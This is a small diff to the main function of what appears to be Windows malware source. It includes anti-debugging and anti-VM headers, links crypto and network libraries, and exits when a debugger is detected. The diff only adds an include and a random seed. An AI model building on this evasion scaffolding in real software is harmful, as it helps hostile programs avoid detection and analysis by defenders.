@@ -25,13 +25,18 @@
 #include "antidebug.h"
 #include "antivm.h"
 
+#include "utils.h"
+
 #pragma comment(lib, "Crypt32")
 #pragma comment(lib, "Bcrypt.lib")
 #pragma comment(lib, "Wininet.lib")
 #pragma comment(lib, "Ws2_32.lib")
 
+
 int main()
 {
+	srand(time(0));
+
 	AntiDebug adbg;
 	if (adbg.GetDetected())
 		goto EXIT;
